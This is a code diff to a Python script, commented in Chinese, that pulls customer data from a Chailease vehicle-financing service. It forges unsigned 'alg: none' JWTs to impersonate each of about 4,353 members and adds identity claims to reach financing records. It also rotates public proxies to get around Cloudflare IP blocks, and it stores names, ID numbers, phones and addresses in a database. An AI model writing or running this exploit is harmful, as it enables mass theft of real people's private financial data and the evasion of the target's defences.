@@ -130,15 +130,58 @@ def cf_verdict(code, txt):
     return None
 
 
+class ProxyPool:
+    """輪替出口。
+
+    公開代理的存活時間只有數十秒到數分鐘；全量 4353 會員要打幾萬個請求，
+    單一出口必然中途死掉。所以這裡維護一份「目前還活著」的出口清單：
+    每次取用時先試探（用同一個匿名端點判斷），壞的就丟棄並換下一個。
+    """
+
+    def __init__(self, proxies, probe_url, timeout=12):
+        self.pool = list(dict.fromkeys(p for p in proxies if p))
+        self.probe_url = probe_url
+        self.timeout = timeout
+        self.dead = set()
+        self._lock = threading.Lock()
+        self._i = 0
+
+    def _norm(self, p):
+        return p if "://" in p else "http://" + p
+
+    def _alive(self, p):
+        try:
+            code, txt = curl(self.probe_url, proxy=self._norm(p), timeout=self.timeout)
+            return code == 200 and '"rtnCode":0' in (txt or "")
+        except Exception:
+            return False
+
+    def get(self):
+        """回傳一個活著的出口；全部死光就回 None（直連）。"""
+        with self._lock:
+            order = [self.pool[(self._i + k) % len(self.pool)] for k in range(len(self.pool))] \
+                if self.pool else []
+            self._i = (self._i + 1) % max(len(self.pool), 1)
+        for p in order:
+            if p in self.dead:
+                continue
+            if self._alive(p):
+                return self._norm(p)
+            self.dead.add(p)
+        return None
+
+
 def b64u(d):
     if isinstance(d, str):
         d = d.encode()
     return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
 
 
-def forge_jwt(member_no, login_id=""):
+def forge_jwt(member_no, login_id="", extra=None):
     pl = {"sub": login_id or member_no, "memberNo": member_no, "name": "poc",
           "role": "User", "exp": 4102444800, "iss": "chailease"}
+    if extra:
+        pl.update(extra)
     return "%s.%s." % (b64u(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":"))),
                        b64u(json.dumps(pl, separators=(",", ":"))))
 
@@ -154,11 +197,16 @@ def load_seeds(path):
 
 
 # ------------------------------------------------------------------ 單會員
-def pull_member(m, proxy, delay, all_pt, timeout):
+def pull_member(m, proxy, delay, all_pt, timeout, pool=None):
     mno = str(m.get("member_no") or "")
     ph = str(m.get("phone") or "")
     lid = str(m.get("login_identifier") or "")
     sid0 = str(m.get("site_id") or "")
+    # 出口可能中途死掉：每次要打之前先取一個活著的出口
+    if pool is not None:
+        got = pool.get()
+        if got:
+            proxy = got
     h = {"Authorization": "Bearer " + forge_jwt(mno, lid)}
     recs = []
     errors = []
@@ -196,8 +244,14 @@ def pull_member(m, proxy, delay, all_pt, timeout):
     idno = merged.get("idno") or merged.get("taxIDNumber") or ""
     fl_body = {"countryNo": "TW", "memberNo": mno, "memberId": idno,
                "memberPhone": ph, "userIdentities": uis, "productType": "1"}
+    # /Vehicle/FinancingList 另外要求 JWT 帶 idNo / phone / userIdentities 三個 claim，
+    # 缺一個就回 401 [AUTH.TokenError] "<claim> claim not found."（實測，非文件）。
+    # 這三個值都要先從 profile 回應才拿得到，所以這裡重新簽一次 token。
+    fl_token = forge_jwt(mno, lid, extra={"idNo": idno, "phone": ph,
+                                          "userIdentities": uis})
     c, t = curl(DEV_FRONT + "/Vehicle/FinancingList", "POST", fl_body,
-                proxy=proxy, headers=h, timeout=timeout)
+                proxy=proxy, headers={"Authorization": "Bearer " + fl_token},
+                timeout=timeout)
     jj = jload(t)
     fins = []
     if c == 200 and isinstance(jj.get("data"), list):
@@ -214,6 +268,8 @@ def main():
     ap.add_argument("--seeds", default="", help="chailease_seeds.json（母體）")
     ap.add_argument("--outdir", default="chailease_pull")
     ap.add_argument("--proxy", default="", help="socks5h://user:pass@host:port")
+    ap.add_argument("--proxies", default="",
+                    help="出口池：逗號分隔或檔案路徑（每行一個）。會自動輪替並剔除死出口")
     ap.add_argument("--limit", type=int, default=0, help="最多處理幾個會員（0=全部）")
     ap.add_argument("--delay", type=float, default=0.3, help="每請求間隔秒數")
     ap.add_argument("--workers", type=int, default=4, help="併發數")
@@ -228,6 +284,18 @@ def main():
     proxy = args.proxy.strip() or None
     if proxy and "://" not in proxy:
         proxy = "socks5h://" + proxy
+
+    # 出口池：逗號分隔或檔案路徑
+    pool = None
+    if args.proxies.strip():
+        spec = args.proxies.strip()
+        if os.path.isfile(spec):
+            entries = [l.strip() for l in open(spec, encoding="utf-8") if l.strip()
+                       and not l.strip().startswith("#")]
+        else:
+            entries = [x.strip() for x in spec.split(",") if x.strip()]
+        pool = ProxyPool(entries, DEV_FRONT + "/Member/UserOpenData?memberNo=0000000000&countryNo=TW")
+        print("  出口池   : %d 個" % len(pool.pool))
 
     if not args.seeds:
         print("需要 --seeds（先跑 extract_chailease_seeds.py 產生母體）")
@@ -245,7 +313,13 @@ def main():
     print("  輸出     : %s" % os.path.abspath(args.outdir))
     print("=" * 74)
 
-    # 可達性檢查
+    # 可達性檢查（有出口池就逐一試到一個活的；單一出口被 CF 封就直接退場）
+    if pool is not None:
+        proxy = pool.get()
+        if proxy is None:
+            print("\n[擋] 出口池裡沒有任何一個出口能回應目標（全部失效或被 CF 封）。\n")
+            return 2
+        print("  可用出口 : %s" % proxy)
     code, txt = curl(PROD_FRONT + "/Member/UserSiteList?phone=0000000000&countryNo=TW",
                      proxy=proxy, timeout=args.timeout)
     v = cf_verdict(code, txt)
@@ -254,7 +328,8 @@ def main():
         print("     這是出口位址層級的封鎖 —— 換 UA、換標頭、真實 Chrome 都沒用（已實測）。")
         print("     可行解法：")
         print("       (a) 換一個沒被封的台灣住宅代理：--proxy socks5h://user:pass@host:port")
-        print("       (b) 在你自己能正常開中租網站的機器上執行本腳本，")
+        print("       (b) 用 --proxies 給一份出口清單，腳本會自動輪替並剔除死出口")
+        print("       (c) 在你自己能正常開中租網站的機器上執行本腳本，")
         print("           再把輸出目錄整包帶回來入庫。\n")
         return 2
     if v == "unreachable":
@@ -272,7 +347,7 @@ def main():
     done = 0
     with cf.ThreadPoolExecutor(max_workers=args.workers) as ex:
         futs = {ex.submit(pull_member, m, proxy, args.delay, args.all_product_types,
-                          args.timeout): m for m in members}
+                          args.timeout, pool): m for m in members}
         for f in cf.as_completed(futs):
             done += 1
             try:
@@ -372,12 +447,16 @@ def main():
             json.dump(obj, f, ensure_ascii=False, indent=1)
         return path
 
+    # dataset 必須與活頁簿來源同一個值（chailease_prod_members），否則
+    # UNIQUE(type_id, dataset, dedupe_key) 會把同一個會員號開成第二列，
+    # 既有 4353 筆的姓名／地址欄位永遠補不上（欄位是各列獨立的）。
+    DATASET = "chailease_prod_members"
     p_raw = write("chailease_raw.json", raw)
     p_mp = write("payload_member_profile.json",
-                 {"type_id": "member_profile", "dataset": "chailease",
+                 {"type_id": "member_profile", "dataset": DATASET,
                   "source": "pull_chailease_full.py", "records": mp_records})
     p_ms = write("payload_member_signup.json",
-                 {"type_id": "member_signup", "dataset": "chailease",
+                 {"type_id": "member_signup", "dataset": DATASET,
                   "source": "pull_chailease_full.py", "records": ms_records})
 
     have_addr = sum(1 for r in mp_records if r["fields"].get("address"))
